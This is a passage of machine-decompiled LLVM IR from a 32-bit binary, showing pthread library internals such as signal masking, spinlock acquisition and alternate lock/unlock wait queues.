  uselistorder label %dec_label_pc_80585be, { 1, 0 }
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_80585d8 = icmp eq i32 %arg2, 0
  br i1 %v1_80585d8, label %entry.dec_label_pc_805864a_crit_edge, label %dec_label_pc_80585dc

entry.dec_label_pc_805864a_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805864a

dec_label_pc_80585dc:                             ; preds = %entry
  %v2_80585dc = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_80585dc, i32* @ebx, align 4
  store i32 %v2_80585dc, i32* %stack_var_-156, align 4
  %v3_80585e8 = bitcast i32* %stack_var_-136 to i16*
  %v4_80585e8 = call i32 @memcpy(i16* %v3_80585e8, i32 %arg2, i32 128)
  %v5_80585f0 = icmp eq i32 %arg1, 0
  %v9_80585f0 = icmp eq i32 %arg1, 1
  br i1 %v9_80585f0, label %dec_label_pc_8058631, label %dec_label_pc_80585f5

dec_label_pc_80585f5:                             ; preds = %dec_label_pc_80585dc
  %v9_80585f5 = icmp eq i32 %arg1, 2
  br i1 %v9_80585f5, label %dec_label_pc_8058600, label %dec_label_pc_80585fa

dec_label_pc_80585fa:                             ; preds = %dec_label_pc_80585f5
  br i1 %v5_80585f0, label %dec_label_pc_8058612, label %dec_label_pc_8058646

dec_label_pc_8058600:                             ; preds = %dec_label_pc_80585f5
  %v0_8058602 = load i32, i32* @global_var_8075308.602, align 8
  store i32 %v2_80585dc, i32* %stack_var_-156, align 4
  %v2_8058609 = call i32 @__GI_sigaddset(i32 %v2_80585dc, i32 %v0_8058602)
  br label %dec_label_pc_8058614

dec_label_pc_8058612:                             ; preds = %dec_label_pc_80585fa
  br label %dec_label_pc_8058614

dec_label_pc_8058614:                             ; preds = %dec_label_pc_8058600, %dec_label_pc_8058612
  store i32 %v2_80585dc, i32* %stack_var_-156, align 4
  %v1_805861b = call i32 @__GI_sigdelset(i32 %v2_80585dc)
  %v0_8058620 = load i32, i32* @global_var_8075310.577, align 16
  %tmp20 = icmp slt i32 %v0_8058620, 1
  br i1 %tmp20, label %dec_label_pc_8058646, label %dec_label_pc_805862c

dec_label_pc_805862c:                             ; preds = %dec_label_pc_8058614
  br label %dec_label_pc_8058639

dec_label_pc_8058631:                             ; preds = %dec_label_pc_80585dc
  br label %dec_label_pc_8058639

dec_label_pc_8058639:                             ; preds = %dec_label_pc_805862c, %dec_label_pc_8058631
  store i32 %v2_80585dc, i32* %stack_var_-156, align 4
  %v1_805863a = call i32 @__GI_sigdelset(i32 %v2_80585dc)
  br label %dec_label_pc_805864a

dec_label_pc_8058646:                             ; preds = %dec_label_pc_80585fa, %dec_label_pc_8058614
  br label %dec_label_pc_805864a

dec_label_pc_805864a:                             ; preds = %entry.dec_label_pc_805864a_crit_edge, %dec_label_pc_8058639, %dec_label_pc_8058646
  %v0_8058652 = phi i32 [ 0, %entry.dec_label_pc_805864a_crit_edge ], [ %v2_80585dc, %dec_label_pc_8058639 ], [ %v2_80585dc, %dec_label_pc_8058646 ]
  store i32 %arg1, i32* %stack_var_-156, align 4
  %v3_8058654 = inttoptr i32 %v0_8058652 to %_TYPEDEF_sigset_t*
  %v4_8058654 = call i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %v3_8058654, i32 %arg3)
  %v8_805865e = icmp eq i32 %v4_8058654, -1
  %v1_805865f = icmp eq i1 %v8_805865e, false
  br i1 %v1_805865f, label %dec_label_pc_8058668, label %dec_label_pc_8058661

dec_label_pc_8058661:                             ; preds = %dec_label_pc_805864a
  %v0_8058661 = load i32, i32* %stack_var_-156, align 4
  %v1_8058661 = call i32 @__errno_location(i32 %v0_8058661)
  %v1_8058666 = inttoptr i32 %v1_8058661 to i32*
  %v2_8058666 = load i32, i32* %v1_8058666, align 4
  br label %dec_label_pc_8058668

dec_label_pc_8058668:                             ; preds = %dec_label_pc_805864a, %dec_label_pc_8058661
  %v0_805866e = phi i32 [ 0, %dec_label_pc_805864a ], [ %v2_8058666, %dec_label_pc_8058661 ]
  ret i32 %v0_805866e

; uselistorder directives
  uselistorder i32 %v2_80585dc, { 0, 1, 7, 6, 3, 2, 5, 4, 8, 9 }
  uselistorder i32 %arg1, { 4, 3, 0, 1, 2, 5 }
  uselistorder label %dec_label_pc_8058668, { 1, 0 }
  uselistorder label %dec_label_pc_805864a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8058646, { 1, 0 }
  uselistorder label %dec_label_pc_8058639, { 1, 0 }
  uselistorder label %dec_label_pc_8058614, { 1, 0 }
}

define i32 @wait_node_dequeue() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8058678 = load i32, i32* @edx, align 4
  %v1_8058678 = load i32, i32* @eax, align 4
  %v12_8058678 = icmp eq i32 %v0_8058678, %v1_8058678
  %v1_805867a = icmp eq i1 %v12_8058678, false
  %v0_8058695.pre = load i32, i32* @ecx, align 4
  br i1 %v1_805867a, label %dec_label_pc_8058695, label %dec_label_pc_805867c

dec_label_pc_805867c:                             ; preds = %entry
  %v1_805867c = inttoptr i32 %v0_8058695.pre to i32*
  %v2_805867c = load i32, i32* %v1_805867c, align 4
  store i32 %v2_805867c, i32* %ebx.global-to-local, align 4
  %v1_8058680 = inttoptr i32 %v0_8058678 to i32*
  %v2_8058680 = load i32, i32* %v1_8058680, align 4
  %v15_8058680 = icmp eq i32 %v0_8058695.pre, %v2_8058680
  %v22_8058680 = select i1 %v15_8058680, i32 %v2_805867c, i32 %v2_8058680
  store i32 %v22_8058680, i32* %v1_8058680, align 4
  %v1_8058684 = zext i1 %v15_8058680 to i32
  %v2_8058684 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8058684 = and i32 %v2_8058684, -256
  %v4_8058684 = or i32 %v3_8058684, %v1_8058684
  store i32 %v4_8058684, i32* %ebx.global-to-local, align 4
  %v4_8058687 = icmp eq i1 %v15_8058680, false
  br i1 %v4_8058687, label %dec_label_pc_805868f.preheader, label %dec_label_pc_8058699

dec_label_pc_805868f.preheader:                   ; preds = %dec_label_pc_805867c
  %v0_805868f.pre = load i32, i32* @edx, align 4
  %v0_8058691.pre = load i32, i32* @ecx, align 4
  %v1_805868f7 = inttoptr i32 %v0_805868f.pre to i32*
  %v2_805868f8 = load i32, i32* %v1_805868f7, align 4
  %v12_805869110 = icmp eq i32 %v0_8058691.pre, %v2_805868f8
  %v1_805869311 = icmp eq i1 %v12_805869110, false
  br i1 %v1_805869311, label %dec_label_pc_805868d, label %dec_label_pc_8058695.loopexit

dec_label_pc_805868d:                             ; preds = %dec_label_pc_805868f.preheader, %dec_label_pc_805868d
  %v2_805868f12 = phi i32 [ %v2_805868f, %dec_label_pc_805868d ], [ %v2_805868f8, %dec_label_pc_805868f.preheader ]
  %v1_805868f = inttoptr i32 %v2_805868f12 to i32*
  %v2_805868f = load i32, i32* %v1_805868f, align 4
  %v12_8058691 = icmp eq i32 %v0_8058691.pre, %v2_805868f
  %v1_8058693 = icmp eq i1 %v12_8058691, false
  br i1 %v1_8058693, label %dec_label_pc_805868d, label %dec_label_pc_8058695.loopexit

dec_label_pc_8058695.loopexit:                    ; preds = %dec_label_pc_805868d, %dec_label_pc_805868f.preheader
  %v0_805868f.lcssa = phi i32 [ %v0_805868f.pre, %dec_label_pc_805868f.preheader ], [ %v2_805868f12, %dec_label_pc_805868d ]
  br label %dec_label_pc_8058695

dec_label_pc_8058695:                             ; preds = %entry, %dec_label_pc_8058695.loopexit
  %v1_8058697 = phi i32 [ %v0_805868f.lcssa, %dec_label_pc_8058695.loopexit ], [ %v0_8058678, %entry ]
  %v0_8058695 = phi i32 [ %v0_8058691.pre, %dec_label_pc_8058695.loopexit ], [ %v0_8058695.pre, %entry ]
  %v1_8058695 = inttoptr i32 %v0_8058695 to i32*
  %v2_8058695 = load i32, i32* %v1_8058695, align 4
  %v2_8058697 = inttoptr i32 %v1_8058697 to i32*
  store i32 %v2_8058695, i32* %v2_8058697, align 4
  br label %dec_label_pc_8058699

dec_label_pc_8058699:                             ; preds = %dec_label_pc_805867c, %dec_label_pc_8058695
  %v2_8058699 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_8058699

; uselistorder directives
  uselistorder i32 %v2_805868f8, { 1, 0 }
  uselistorder i32 %v0_8058691.pre, { 2, 1, 0 }
  uselistorder i1 %v15_8058680, { 1, 2, 0 }
  uselistorder i32 %v2_8058680, { 1, 0 }
  uselistorder i32 %v0_8058695.pre, { 1, 0, 2 }
  uselistorder i32 %v0_8058678, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8058699, { 1, 0 }
  uselistorder label %dec_label_pc_8058695, { 1, 0 }
  uselistorder label %dec_label_pc_805868d, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v0_805869c = load i32, i32* @esi, align 4
  %v0_805869d = load i32, i32* @ebx, align 4
  %v0_805869e = load i32, i32* @eax, align 4
  store i32 %v0_805869e, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v2_80586ca = ptrtoint i32* %stack_var_-16 to i32
  %v1_80586dc11 = inttoptr i32 %v0_805869e to i32*
  %v2_80586dc12 = load i32, i32* %v1_80586dc11, align 4
  store i32 1, i32* %v1_80586dc11, align 4
  %v1_80586de13 = icmp eq i32 %v2_80586dc12, 0
  %v1_80586e015 = icmp eq i1 %v1_80586de13, false
  br i1 %v1_80586e015, label %dec_label_pc_80586a7, label %dec_label_pc_80586e2

dec_label_pc_80586a7:                             ; preds = %entry, %dec_label_pc_80586d7.backedge
  %v0_80586a7 = load i32, i32* @esi, align 4
  %v1_80586a7 = add i32 %v0_80586a7, -49
  %v6_80586a7 = sub i32 48, %v0_80586a7
  %v7_80586a7 = and i32 %v6_80586a7, %v0_80586a7
  %v8_80586a7 = icmp slt i32 %v7_80586a7, 0
  %v9_80586a7 = icmp eq i32 %v1_80586a7, 0
  %v10_80586a7 = icmp slt i32 %v1_80586a7, 0
  %v3_80586aa = icmp eq i1 %v10_80586a7, %v8_80586a7
  %v4_80586aa = icmp eq i1 %v9_80586a7, false
  %v5_80586aa = and i1 %v4_80586aa, %v3_80586aa
  br i1 %v5_80586aa, label %dec_label_pc_80586b4, label %dec_label_pc_80586ac

dec_label_pc_80586ac:                             ; preds = %dec_label_pc_80586a7
  %v1_80586ac = call i32 @sched_yield(i32 %v0_805869d)
  %v0_80586b1 = load i32, i32* @esi, align 4
  %v1_80586b1 = add i32 %v0_80586b1, 1
  store i32 %v1_80586b1, i32* @esi, align 4
  br label %dec_label_pc_80586d7.backedge

dec_label_pc_80586b4:                             ; preds = %dec_label_pc_80586a7
  store i32 0, i32* %stack_var_-16, align 4
  store i32 0, i32* @esi, align 4
  %v2_80586cf = call i32 @nanosleep(i32 %v2_80586ca, i32 0)
  br label %dec_label_pc_80586d7.backedge

dec_label_pc_80586d7.backedge:                    ; preds = %dec_label_pc_80586b4, %dec_label_pc_80586ac
  %v0_80586dc.pre = load i32, i32* @ebx, align 4
  %v1_80586dc = inttoptr i32 %v0_80586dc.pre to i32*
  %v2_80586dc = load i32, i32* %v1_80586dc, align 4
  store i32 1, i32* %v1_80586dc, align 4
  %v1_80586de = icmp eq i32 %v2_80586dc, 0
  %v1_80586e0 = icmp eq i1 %v1_80586de, false
  br i1 %v1_80586e0, label %dec_label_pc_80586a7, label %dec_label_pc_80586e2

dec_label_pc_80586e2:                             ; preds = %dec_label_pc_80586d7.backedge, %entry
  %v2_80586dc.lcssa = phi i32 [ %v2_80586dc12, %entry ], [ %v2_80586dc, %dec_label_pc_80586d7.backedge ]
  store i32 %v0_805869d, i32* @ebx, align 4
  store i32 %v0_805869c, i32* @esi, align 4
  ret i32 %v2_80586dc.lcssa

; uselistorder directives
  uselistorder i32 %v1_80586a7, { 1, 0 }
  uselistorder label %dec_label_pc_80586a7, { 1, 0 }
}

define i32 @wait_node_free() local_unnamed_addr {
entry:
  %v0_80586e8 = load i32, i32* @ebx, align 4
  %v0_80586e9 = load i32, i32* @eax, align 4
  store i32 %v0_80586e9, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_8079c48.603 to i32), i32* @eax, align 4
  %v1_80586f3 = call i32 @__pthread_acquire(i32 %v0_80586e8)
  %v0_80586f8 = load i32, i32* @global_var_8079c44.604, align 4
  %v1_80586fd = load i32, i32* @ebx, align 4
  %v2_80586fd = inttoptr i32 %v1_80586fd to i32*
  store i32 %v0_80586f8, i32* %v2_80586fd, align 4
  %v0_80586ff = load i32, i32* @ebx, align 4
  store i32 %v0_80586ff, i32* @global_var_8079c44.604, align 4
  store i32 0, i32* @global_var_8079c48.603, align 8
  ret i32 %v0_80586f8
}

define i32 @restart.3() local_unnamed_addr {
entry:
  %v0_8058716 = load i32, i32* @eax, align 4
  %v1_8058717 = call i32 @__pthread_restart_new(i32 %v0_8058716)
  ret i32 %v1_8058717
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8058720 = load i32, i32* @ebp, align 4
  %v0_8058721 = load i32, i32* @edi, align 4
  %v0_8058722 = load i32, i32* @esi, align 4
  %v0_8058723 = load i32, i32* @ebx, align 4
  store i32 %v0_8058723, i32* %stack_var_-16, align 4
  store i32 %tmp10, i32* @esi, align 4
  br label %dec_label_pc_805872b

dec_label_pc_805872b:                             ; preds = %dec_label_pc_805872b.backedge, %entry
  %v24_8058736 = phi i32 [ %v0_805872b.pre, %dec_label_pc_805872b.backedge ], [ %tmp10, %entry ]
  %v1_805872b = inttoptr i32 %v24_8058736 to i32*
  %v2_805872b = load i32, i32* %v1_805872b, align 4
  store i32 %v2_805872b, i32* %edx.global-to-local, align 4
  %tmp = or i32 %v2_805872b, 1
  %tmp54 = icmp eq i32 %tmp, 1
  br i1 %tmp54, label %dec_label_pc_8058732, label %dec_label_pc_8058759.lr.ph.lr.ph

dec_label_pc_8058732:                             ; preds = %dec_label_pc_805872b
  store i32 0, i32* @ecx, align 4
  %v2_8058736 = load i32, i32* %v1_805872b, align 4
  %v15_8058736 = icmp eq i32 %v2_805872b, %v2_8058736
  %v22_8058736 = select i1 %v15_8058736, i32 0, i32 %v2_8058736
  store i32 %v22_8058736, i32* %v1_805872b, align 4
  %v1_805873a = zext i1 %v15_8058736 to i32
  %v2_805873a = load i32, i32* %edx.global-to-local, align 4
  %v3_805873a = and i32 %v2_805873a, -256
  %v4_805873a = or i32 %v3_805873a, %v1_805873a
  store i32 %v4_805873a, i32* %edx.global-to-local, align 4
  %v4_805873d = icmp eq i1 %v15_8058736, false
  br i1 %v4_805873d, label %dec_label_pc_805872b.backedge, label %dec_label_pc_80587c6.loopexit

dec_label_pc_805872b.backedge:                    ; preds = %dec_label_pc_8058732, %dec_label_pc_8058798, %dec_label_pc_80587a2
  %v0_805872b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805872b

dec_label_pc_8058759.lr.ph.lr.ph:                 ; preds = %dec_label_pc_805872b
  store i32 %v2_805872b, i32* @ebx, align 4
  store i32 %v24_8058736, i32* @ebp, align 4
  store i32 %v2_805872b, i32* @edi, align 4
  store i32 %v24_8058736, i32* %stack_var_-28, align 4
  br label %dec_label_pc_8058759.lr.ph

dec_label_pc_8058759:                             ; preds = %dec_label_pc_8058759.lr.ph, %dec_label_pc_805875f
  %v0_805878f31 = phi i32 [ %v0_8058793345, %dec_label_pc_8058759.lr.ph ], [ %v2_8058773, %dec_label_pc_805875f ]
  %v0_805878c30 = phi i32 [ %v0_8058761544, %dec_label_pc_8058759.lr.ph ], [ %v0_8058771, %dec_label_pc_805875f ]
  %v0_805876329 = phi i32 [ %v0_8058763643, %dec_label_pc_8058759.lr.ph ], [ %v1_8058771, %dec_label_pc_805875f ]
  %v1_8058759 = add i32 %v0_805878f31, 8
  %v2_8058759 = inttoptr i32 %v1_8058759 to i32*
  %v3_8058759 = load i32, i32* %v2_8058759, align 4
  %v4_8058759 = icmp eq i32 %v3_8058759, 0
  br i1 %v4_8058759, label %dec_label_pc_805877a, label %dec_label_pc_805875f

dec_label_pc_805875f:                             ; preds = %dec_label_pc_8058759
  store i32 %v0_805878f31, i32* @ecx, align 4
  store i32 %v0_805878c30, i32* @edx, align 4
  store i32 %v0_805876329, i32* @eax, align 4
  %v0_8058765 = call i32 @wait_node_dequeue()
  %v0_805876a = load i32, i32* @ebx, align 4
  store i32 %v0_805876a, i32* @eax, align 4
  %v0_805876c = call i32 @wait_node_free()
  %v0_8058771 = load i32, i32* @ebp, align 4
  %v1_8058771 = load i32, i32* @esi, align 4
  %v1_8058773 = inttoptr i32 %v0_8058771 to i32*
  %v2_8058773 = load i32, i32* %v1_8058773, align 4
  store i32 %v2_8058773, i32* @ebx, align 4
  %v9_8058793 = icmp eq i32 %v2_8058773, 1
  %v1_8058796 = icmp eq i1 %v9_8058793, false
  br i1 %v1_8058796, label %dec_label_pc_8058759, label %dec_label_pc_8058798

dec_label_pc_805877a:                             ; preds = %dec_label_pc_8058759
  %v1_805877a = add i32 %v0_805878f31, 4
  %v2_805877a = inttoptr i32 %v1_805877a to i32*
  %v3_805877a = load i32, i32* %v2_805877a, align 4
  %v1_805877d = add i32 %v3_805877a, 24
  %v2_805877d = inttoptr i32 %v1_805877d to i32*
  %v3_805877d = load i32, i32* %v2_805877d, align 4
  %v5_8058784 = icmp slt i32 %v3_805877d, %stack_var_-24.1.ph46
  br i1 %v5_8058784, label %dec_label_pc_805878f, label %dec_label_pc_8058786

dec_label_pc_8058786:                             ; preds = %dec_label_pc_805877a
  store i32 %v0_805878f31, i32* @edi, align 4
  store i32 %v0_805878c30, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805878f

dec_label_pc_805878f:                             ; preds = %dec_label_pc_805877a, %dec_label_pc_8058786
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.1.ph46, %dec_label_pc_805877a ], [ %v3_805877d, %dec_label_pc_8058786 ]
  store i32 %v0_805878f31, i32* @ebp, align 4
  %v1_8058791 = inttoptr i32 %v0_805878f31 to i32*
  %v2_8058791 = load i32, i32* %v1_8058791, align 4
  store i32 %v2_8058791, i32* @ebx, align 4
  %v9_805879326 = icmp eq i32 %v2_8058791, 1
  %v1_805879628 = icmp eq i1 %v9_805879326, false
  br i1 %v1_805879628, label %dec_label_pc_8058759.lr.ph, label %dec_label_pc_8058798

dec_label_pc_8058759.lr.ph:                       ; preds = %dec_label_pc_8058759.lr.ph.lr.ph, %dec_label_pc_805878f
  %stack_var_-24.1.ph46 = phi i32 [ -2147483648, %dec_label_pc_8058759.lr.ph.lr.ph ], [ %stack_var_-24.0, %dec_label_pc_805878f ]
  %v0_8058793345 = phi i32 [ %v2_805872b, %dec_label_pc_8058759.lr.ph.lr.ph ], [ %v2_8058791, %dec_label_pc_805878f ]
  %v0_8058761544 = phi i32 [ %v24_8058736, %dec_label_pc_8058759.lr.ph.lr.ph ], [ %v0_805878f31, %dec_label_pc_805878f ]
  %v0_8058763643 = phi i32 [ %v24_8058736, %dec_label_pc_8058759.lr.ph.lr.ph ], [ %v0_805876329, %dec_label_pc_805878f ]
  br label %dec_label_pc_8058759

dec_label_pc_8058798:                             ; preds = %dec_label_pc_805875f, %dec_label_pc_805878f
  %stack_var_-24.1.ph.lcssa = phi i32 [ %stack_var_-24.0, %dec_label_pc_805878f ], [ %stack_var_-24.1.ph46, %dec_label_pc_805875f ]
  %v0_805878f.lcssa = phi i32 [ %v2_8058791, %dec_label_pc_805878f ], [ %v2_8058773, %dec_label_pc_805875f ]
  %v8_8058798 = icmp eq i32 %stack_var_-24.1.ph.lcssa, -2147483648
  br i1 %v8_8058798, label %dec_label_pc_805872b.backedge, label %dec_label_pc_80587a2

dec_label_pc_80587a2:                             ; preds = %dec_label_pc_8058798
  %v0_80587a4 = load i32, i32* @edi, align 4
  %v1_80587a4 = add i32 %v0_80587a4, 8
  %v2_80587a4 = inttoptr i32 %v1_80587a4 to i32*
  %v3_80587a4 = load i32, i32* %v2_80587a4, align 4
  store i32 %v0_805878f.lcssa, i32* %v2_80587a4, align 4
  %v1_80587a7 = icmp eq i32 %v3_80587a4, 0
  %v1_80587a9 = icmp eq i1 %v1_80587a7, false
  br i1 %v1_80587a9, label %dec_label_pc_805872b.backedge, label %dec_label_pc_80587ab

dec_label_pc_80587ab:                             ; preds = %dec_label_pc_80587a2
  %v2_80587ab = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_80587ab, i32* @edx, align 4
  %v0_80587ae = load i32, i32* @esi, align 4
  store i32 %v0_80587ae, i32* @eax, align 4
  %v0_80587b0 = load i32, i32* @edi, align 4
  store i32 %v0_80587b0, i32* @ecx, align 4
  %v0_80587b2 = call i32 @wait_node_dequeue()
  %v0_80587b7 = load i32, i32* @edi, align 4
  %v1_80587b7 = add i32 %v0_80587b7, 4
  %v2_80587b7 = inttoptr i32 %v1_80587b7 to i32*
  %v3_80587b7 = load i32, i32* %v2_80587b7, align 4
  store i32 %v3_80587b7, i32* @eax, align 4
  %v2_80587bd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80587bd, i32* @ebx, align 4
  %v0_80587c1 = call i32 @restart.3()
  br label %dec_label_pc_80587c6

dec_label_pc_80587c6.loopexit:                    ; preds = %dec_label_pc_8058732
  br label %dec_label_pc_80587c6

dec_label_pc_80587c6:                             ; preds = %dec_label_pc_80587c6.loopexit, %dec_label_pc_80587ab
  %v0_80587cd = phi i32 [ %v2_805872b, %dec_label_pc_80587c6.loopexit ], [ %v0_80587c1, %dec_label_pc_80587ab ]
  store i32 %v0_8058722, i32* @esi, align 4
  store i32 %v0_8058721, i32* @edi, align 4
  store i32 %v0_8058720, i32* @ebp, align 4
  ret i32 %v0_80587cd

; uselistorder directives
  uselistorder i32 %stack_var_-24.1.ph46, { 0, 2, 1 }
  uselistorder i32 %v2_8058791, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8058773, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8058771, { 1, 0 }
  uselistorder i32 %v0_805878f31, { 4, 1, 0, 2, 3, 6, 5 }
  uselistorder i1 %v15_8058736, { 1, 2, 0 }
  uselistorder i32 %v2_8058736, { 1, 0 }
  uselistorder i32 %v2_805872b, { 1, 2, 5, 4, 3, 0, 6 }
  uselistorder i32 %v24_8058736, { 1, 0, 3, 2, 4 }
  uselistorder i32 ()* @wait_node_dequeue, { 1, 0 }
  uselistorder label %dec_label_pc_8058798, { 1, 0 }
  uselistorder label %dec_label_pc_8058759.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_805878f, { 1, 0 }
  uselistorder label %dec_label_pc_805872b.backedge, { 2, 1, 0 }
}

define i32 @thread_self.4() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_80587ce = load i32, i32* @esp, align 4
  %v1_80587ce = load i32, i32* @global_var_8079c4c.565, align 4
  %v7_80587ce = icmp ult i32 %v0_80587ce, %v1_80587ce
  %v1_80587db = icmp eq i1 %v7_80587ce, false
  br i1 %v1_80587db, label %dec_label_pc_805880c, label %dec_label_pc_80587dd

dec_label_pc_80587dd:                             ; preds = %entry
  %v1_80587dd = load i32, i32* @global_var_8079c50.566, align 16
  %v7_80587dd = icmp ult i32 %v0_80587ce, %v1_80587dd
  br i1 %v7_80587dd, label %dec_label_pc_80587f2, label %dec_label_pc_80587e5

dec_label_pc_80587e5:                             ; preds = %dec_label_pc_80587dd
  %v1_80587e5 = load i32, i32* @global_var_8079c54.567, align 4
  %v7_80587e5 = icmp ult i32 %v0_80587ce, %v1_80587e5
  br i1 %v7_80587e5, label %dec_label_pc_805880c, label %dec_label_pc_80587f2

dec_label_pc_80587f2:                             ; preds = %dec_label_pc_80587e5, %dec_label_pc_80587dd
  %v0_80587f2 = load i32, i32* @global_var_807f358.569, align 8
  %v1_80587f2 = icmp eq i32 %v0_80587f2, 0
  br i1 %v1_80587f2, label %dec_label_pc_8058800, label %dec_label_pc_80587fb

dec_label_pc_80587fb:                             ; preds = %dec_label_pc_80587f2
  %v0_80587fb = call i32 @__pthread_find_self()
  br label %dec_label_pc_8058800

dec_label_pc_8058800:                             ; preds = %dec_label_pc_80587f2, %dec_label_pc_80587fb
  %v2_8058806 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805880c

dec_label_pc_805880c:                             ; preds = %dec_label_pc_80587e5, %entry, %dec_label_pc_8058800
  %v0_805880c = phi i32 [ ptrtoint (i32* @global_var_8075120.568 to i32), %dec_label_pc_80587e5 ], [ ptrtoint (i32* @global_var_8074f40 to i32), %entry ], [ %v2_8058806, %dec_label_pc_8058800 ]
  ret i32 %v0_805880c

; uselistorder directives
  uselistorder label %dec_label_pc_805880c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8058800, { 1, 0 }
}

define i32 @suspend.5(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8058810 = load i32, i32* @eax, align 4
  %v1_8058811 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8058810)
  ret i32 %v1_8058811
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp9 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805881a = load i32, i32* @esi, align 4
  %v0_805881b = load i32, i32* @ebx, align 4
  store i32 %v0_805881b, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* @esi, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8058841 = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_8058827

dec_label_pc_8058827:                             ; preds = %dec_label_pc_8058845.dec_label_pc_8058827_crit_edge, %entry
  %v0_8058827 = phi i32 [ %v0_8058827.pre, %dec_label_pc_8058845.dec_label_pc_8058827_crit_edge ], [ %tmp9, %entry ]
  %v1_8058827 = inttoptr i32 %v0_8058827 to i32*
  %v2_8058827 = load i32, i32* %v1_8058827, align 4
  store i32 %v2_8058827, i32* @ebx, align 4
  store i32 1, i32* %ecx.global-to-local, align 4
  %v1_805882e = icmp eq i32 %v2_8058827, 0
  br i1 %v1_805882e, label %dec_label_pc_8058845, label %dec_label_pc_8058832

dec_label_pc_8058832:                             ; preds = %dec_label_pc_8058827
  %v0_8058832 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058832 = icmp eq i32 %v0_8058832, 0
  %v1_8058834 = icmp eq i1 %v1_8058832, false
  br i1 %v1_8058834, label %dec_label_pc_805883d, label %dec_label_pc_8058836

dec_label_pc_8058836:                             ; preds = %dec_label_pc_8058832
  %v0_8058836 = call i32 @thread_self.4()
  store i32 %v0_8058836, i32* %edx.global-to-local, align 4
  %v0_8058853.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805883d

dec_label_pc_805883d:                             ; preds = %dec_label_pc_8058832, %dec_label_pc_8058836
  %v0_8058853.pre = phi i32 [ %v0_8058827, %dec_label_pc_8058832 ], [ %v0_8058853.pre.pre, %dec_label_pc_8058836 ]
  store i32 %v2_8058841, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8058845

dec_label_pc_8058845:                             ; preds = %dec_label_pc_8058827, %dec_label_pc_805883d
  %v3_8058853 = phi i32 [ 1, %dec_label_pc_8058827 ], [ %v2_8058841, %dec_label_pc_805883d ]
  %v24_8058853 = phi i32 [ %v0_8058827, %dec_label_pc_8058827 ], [ %v0_8058853.pre, %dec_label_pc_805883d ]
  store i32 %v2_8058827, i32* %stack_var_-20, align 4
  %v1_8058853 = inttoptr i32 %v24_8058853 to i32*
  %v2_8058853 = load i32, i32* %v1_8058853, align 4
  %v15_8058853 = icmp eq i32 %v2_8058827, %v2_8058853
  %v22_8058853 = select i1 %v15_8058853, i32 %v3_8058853, i32 %v2_8058853
  store i32 %v22_8058853, i32* %v1_8058853, align 4
  %v1_8058857 = zext i1 %v15_8058853 to i32
  %v2_8058857 = load i32, i32* %ecx.global-to-local, align 4
  %v3_8058857 = and i32 %v2_8058857, -256
  %v4_8058857 = or i32 %v3_8058857, %v1_8058857
  store i32 %v4_8058857, i32* @ecx, align 4
  %v4_805885a = icmp eq i1 %v15_8058853, false
  br i1 %v4_805885a, label %dec_label_pc_8058845.dec_label_pc_8058827_crit_edge, label %dec_label_pc_805885e

dec_label_pc_8058845.dec_label_pc_8058827_crit_edge: ; preds = %dec_label_pc_8058845
  %v0_8058827.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8058827

dec_label_pc_805885e:                             ; preds = %dec_label_pc_8058845
  br i1 %v1_805882e, label %dec_label_pc_8058869, label %dec_label_pc_8058862

dec_label_pc_8058862:                             ; preds = %dec_label_pc_805885e
  %v0_8058862 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8058862, i32* @eax, align 4
  %v0_8058864 = load i32, i32* %stack_var_-20, align 4
  %v2_8058864 = call i32 @suspend.5(i32 %v0_8058864, i32 0)
  br label %dec_label_pc_8058869

dec_label_pc_8058869:                             ; preds = %dec_label_pc_805885e, %dec_label_pc_8058862
  %v0_805886e = phi i32 [ 0, %dec_label_pc_805885e ], [ %v2_8058864, %dec_label_pc_8058862 ]
  %v2_805886c = load i32, i32* %stack_var_-8, align 4
